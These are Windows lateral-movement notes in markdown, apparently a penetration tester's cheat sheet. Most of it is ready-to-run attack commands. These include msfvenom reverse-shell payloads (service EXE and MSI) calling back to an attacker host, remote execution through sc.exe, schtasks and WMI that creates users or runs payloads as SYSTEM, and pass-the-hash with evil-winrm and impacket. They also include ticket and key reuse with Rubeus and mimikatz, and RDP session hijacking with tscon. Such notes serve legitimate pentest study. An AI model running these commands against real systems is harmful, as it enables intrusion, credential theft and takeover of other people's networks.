---
title: Windows lateral movement notes
---

- [1. Process spawning via PsExec](#1-process-spawning-via-psexec)
- [2. Process spawning via WinRM](#2-process-spawning-via-winrm)
  - [2.1. Quick method](#21-quick-method)
  - [2.2. Pure PowerShell method](#22-pure-powershell-method)
- [3. Command execution via services](#3-command-execution-via-services)
  - [3.1. Service creation](#31-service-creation)
  - [3.2. Reverse shell](#32-reverse-shell)
- [4. Command execution via scheduled tasks](#4-command-execution-via-scheduled-tasks)
- [5. Abusing WMI](#5-abusing-wmi)
  - [5.1. Establishing WMI session](#51-establishing-wmi-session)
  - [5.2. Reverse shell via MSI packages](#52-reverse-shell-via-msi-packages)
  - [5.3. Command execution (blind)](#53-command-execution-blind)
  - [5.4. Service creation (blind)](#54-service-creation-blind)
  - [5.5. Scheduled task creation (blind)](#55-scheduled-task-creation-blind)
- [6. NTLM](#6-ntlm)
  - [6.1. Pass-the-Hash](#61-pass-the-hash)
- [7. Kerberos](#7-kerberos)
  - [7.1. Pass-the-Ticket](#71-pass-the-ticket)
  - [7.2. Pass-the-Key](#72-pass-the-key)
  - [7.3. Overpass-the-Hash](#73-overpass-the-hash)
- [8. RDP hijacking](#8-rdp-hijacking)
- [9. User hunting](#9-user-hunting)

## 1. Process spawning via PsExec
PsExec is Sysinternals tool. It can execute processes remotely on any machine where we can access. PsExec uses SMB protocol (445/TCP). Target account must be a member of _Administrators_ group.

PsExec workflow:

1. Connect to Admin$ share and upload a `psexesvc.exe` service binary.
2. Connect to the Service Control Manager (SCM), run a service named `PSEXESVC` and associate the service binary with `C:\Windows\psexesvc.exe`.
3. Create named pipes to handle stdin/out/err.

```powershell
psexec64.exe \\<target-ip> -u <user> -p <password> -i "cmd.exe"
```

## 2. Process spawning via WinRM
Main purpose of the WinRM protocol is to run PowerShell commands remotely. It can be used to the lateral movement. Target account must be member of the _Remote Management Users_ group.

### 2.1. Quick method

```powershell
winrs.exe -u:<user> -p:<password> -r:<target-ip> "cmd.exe"
```

### 2.2. Pure PowerShell method

```powershell
$username = '<user>';
$password = '<password>';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
Enter-PSSession -Computername <target-ip> -Credential $credential
Invoke-Command -Computername <target-ip> -Credential $credential -ScriptBlock {whoami}
```

## 3. Command execution via services
Windows services can be used to run arbitrary commands because they execute a command when started. Standard tool for creating a service on remote host is the `sc.exe`. It exploits default ability of Windows services to execute arbitrary commands at the start of the service. Target account must be member of the _Administrators_ group. The victim's OS is in charge of starting the service, so the attacker is not be able to look at the command's output - it's blind attack.

It tries to connect to the Service Control Manager (SVCCTL) throught RPC in two ways:

1. The client will first connect to the Endpoint Mapper (EPM) at port 135 (catalogue of available RPC endpoints) and request information on the SVCCTL service program. The EPM will respond with the IP:PORT of SVCCTL (usually a dynamic port in the range of 49152-65535).
2. The client will try to reach SVCCTL through SMB named pipes on port 445 (SMB) or 139 (SMB over NetBIOS).

> NOTE: The victim's OS is in charge of starting the service, you won't be able to look at the command output.

```bash
# Generate service campatible (exe-service) reverse shell
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=<attacker-ip> LPORT=<attacker-port> -o <output-name.exe>
```

> NOTE: `sc.exe` doesn't allow to specify credentials as a part of the command so it might be necessary to start new shell (with another account) using `runas` command.

```powershell
# Start new shell

# Execute command - create a user
sc.exe \\<target-ip> create <service> binPath= "net user <user> <pass> /add" start= auto
sc.exe \\<target-ip> start <service>

# Stop service
sc.exe \\<target-ip> stop <service>
sc.exe \\<target-ip> delete <service>
```

### 3.1. Service creation

```powershell
$ServiceName = "<service-name>"
$Command = "<cmd-payload>"

# Run a service remotely
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
  Name = $ServiceName;
  DisplayName = $ServiceName;
  PathName = $Command;
  ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
  StartMode = "Manual"
}
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE '$ServiceName'"
Invoke-CimMethod -InputObject $Service -MethodName StartService

# Stop the service
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

### 3.2. Reverse shell
If we try to run a reverse shell using this method, the reverse shell disconnects immediately after execution. Service executables are different to standard `.exe` files, and therefore non-service executables are killed by the service manager almost immediately. `Msfvenom` supports the `exe-service` format, which will encapsulate any payload inside a fully functional service executable, preventing it from getting killed.

## 4. Command execution via scheduled tasks
Scheduled tasks can be created remotely. The `schtasks` tool is available in any Windows installation. The victim's OS is in charge of running the scheduled task, so the attacker is not able to look at the command's output - it's blind attack.

> NOTE: The victim's OS is in charge of running the scheduled task, you won't be able to look at the command output.

```powershell
# Create a task
schtasks /s <target-ip> /RU <user> /create /tn <task-name> /tr <command> /sc ONCE /sd 01/01/1970 /st 00:00 

# Run the task
schtasks /s <target-ip> /run /TN <task-name> 

# Stop the task
schtasks /S <target-ip> /TN <task-name> /DELETE /F
```

## 5. Abusing WMI
WMI allows administrators to perform standard management tasks that attacker can abuse to perform lateral movement. Abusing WMI an attacker is able to remotely create a process or a scheduled task, run a service, install a MSI package.

WMI provides **bunch of ways to perform lateral movement** but first of all WMI session must be established:

### 5.1. Establishing WMI session

```powershell
$Username = "<target-user>";
$Password = "<target-pass>";
$TargetHost = "<target-ip>";

# Create PSCredential object
$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force;
$Credential = New-Object System.Management.Automation.PSCredential $Username, $SecurePassword;

# Establish WMI session
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName $TargetHost -Credential $Credential -SessionOption $Opt -ErrorAction Stop
```

### 5.2. Reverse shell via MSI packages

```powershell
# Generate MSI reverse shell payload 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4443 -f msi > "<package-name.msi>"

# Install MSI payload
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "<package-path.msi>"; Options = ""; AllUsers = $false}
```

### 5.3. Command execution (blind)

```powershell
# Execute a command remotely (blind)
$Command = "<cmd-payload>"
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
```

### 5.4. Service creation (blind)

```powershell
$ServiceName = "<service-name>"
$Command = "<cmd-payload>"

# Run a service remotely
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
  Name = $ServiceName;
  DisplayName = $ServiceName;
  PathName = $Command;
  ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
  StartMode = "Manual"
}
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE '$ServiceName'"
Invoke-CimMethod -InputObject $Service -MethodName StartService

# Stop the service
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

### 5.5. Scheduled task creation (blind)

```powershell
$Command = "<cmd-payload>"
$Args = "<payload-args>"
$TaskName = "<task-name>"

# Run a task
$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName $TaskName
Start-ScheduledTask -CimSession $Session -TaskName $TaskName

# Stop the task
Unregister-ScheduledTask -CimSession $Session -TaskName $TaskName
```

## 6. NTLM

### 6.1. Pass-the-Hash
As a result of extracting credentials from a host an attacker might get NT hash. Sometimes it can be too hard to crack the hash but it's possible to authenticate with the hash itself. PtH attacks can work over a large number of technologies, either using Windows-Windows or Linux-Windows tools.

Here's the great [overview of different technologies](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/). Sometimes certain technology might not work, then it's worth to check another one.

> Some of the technologies that might be used to perform PtH: SMB, WinRM, PsExec, WMI, RPC, RDP.

```bash
# Get shell via WinRM
evil-winrm -i <victim-ip> -u <username> -H <nt-hash>

# Get shell via SMB (PsExec)
impacket-psexec -hashes <NT:LM> <username@target-ip>
```

## 7. Kerberos

### 7.1. Pass-the-Ticket
Sometimes it is possible to extract Kerberos tickets and session keys (both are required) from LSASS memory using e.g. `mimikatz` or `rubeus`. Best tickets to steal are TGTs because they can be used to access any service. TGSs are only good for some specific services. Injecting ticket in our own session doesn't require administrator privileges.

```powershell
# Inject ticket in the current logon session
Rubeus.exe ptt /ticket:<b64-ticket|kirbi-file>

# List Kerberos keys in memory (check if injected successfully)
klist

# Confirm that you have Administrator rights
dir \\<dc-ip>\C$
```

### 7.2. Pass-the-Key
When a user requests a TGT it must prove its identity to the KDC. The key derived from user's password is used for this purpose (both the KDC and the user posses the key). The key is used to encrypt a timestamp sent by the user during the TGT requesting process. There is a couple possible key formats (DES, RC4, AES-128, AES-256). They depends on the algorithm used to encrypt the timestamp (Windows version and Kerberos configuration). If an attacker obtain any of these keys, he can ask the KDC for a TGT without providing the actual user's password.

```powershell
#Run a :command as a different :user using :key
./mimikatz.exe 
> sekurlsa::pth /user:<user> /rc4:key /run:<command>
```

> **NOTE**: Available algorithms: `rc4`, `aes128`, `aes256`.

### 7.3. Overpass-the-Hash
Related to _pass-the-key_ attack. If the RC4 algorithm is used, the RC4 key is equal to the NT hash of a user. It means that if an attacker is able to steal the NT hash, he would be able to request the TGT even if the NTLM authentication is disabled.

## 8. RDP hijacking
TBD

```powershell
# List sessions
query session

# Hijack
tscon <id> /dest:<current-connection>
```

## 9. User hunting
[Read more](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/D%20-%20User%20Hunting)

TBD
